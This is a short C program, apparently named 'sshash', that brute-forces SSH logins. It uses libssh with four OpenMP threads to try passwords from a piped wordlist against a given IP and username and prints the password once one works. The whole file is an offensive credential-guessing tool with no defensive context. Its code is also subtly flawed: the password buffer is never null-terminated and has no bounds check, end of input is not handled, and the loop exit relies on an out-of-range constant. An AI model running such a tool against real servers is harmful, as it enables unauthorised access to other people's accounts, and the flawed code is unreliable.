#include <libssh/libssh.h>
#include <ncurses.h>
#include <fcntl.h>
#include <stdlib.h>
#include <omp.h>

int main(int argc, char **argv)
{
	if(argc < 3)
	{
		printf("cat wordlist |./sshash ip username\n");
		exit(-1);
	}
	initscr();
	cbreak();
	noecho();
	
	ssh_init();
	
	int nt = 4;
	
	ssh_session SSH[nt];
	
	for(long int X=0; X<0xffffffff; ++X)
	{
		#pragma omp parallel for
		for(int x=0; x<nt; ++x)
		{
			char pass[128];
			
			char c;
			int scroll;
			if(X % 6 == 0)//every 6 attempts
			{	
				if(X != 0)//but for the first
				{
					ssh_disconnect(SSH[x]);
					ssh_free(SSH[x]);
				}	
				SSH[x] = ssh_new();
	
				ssh_options_set(SSH[x], SSH_OPTIONS_HOST, argv[1]);
				ssh_options_set(SSH[x], SSH_OPTIONS_USER, argv[2]);
	
				if(ssh_connect(SSH[x]) != 0)
				{
					endwin();
					printf("%s\n", ssh_get_error(SSH[x]));
					exit(-1);
				}
			}
			scroll = 0;
			#pragma omp critical
			while(1)
			{
				fread(&c, 1, 1, stdin);
				if(c == '\n') break;
				pass[scroll] = c;
				++scroll;
			}
			if(ssh_userauth_password(SSH[x], NULL, pass) != SSH_AUTH_SUCCESS)
			{
				#pragma omp critical
				{
					mvprintw(0, 0, "%s:%s:%s\n", argv[1], argv[2], pass);
					refresh();
				}
				continue;
			}
			else
			{
				endwin();
				printf("Password is %s\n", pass);
				ssh_disconnect(SSH[x]);
				ssh_free(SSH[x]);
				X = 0xffffffffe;//break
			}
		}
		//end ncurses gracefully
		#pragma omp critical
		endwin();
	}
}
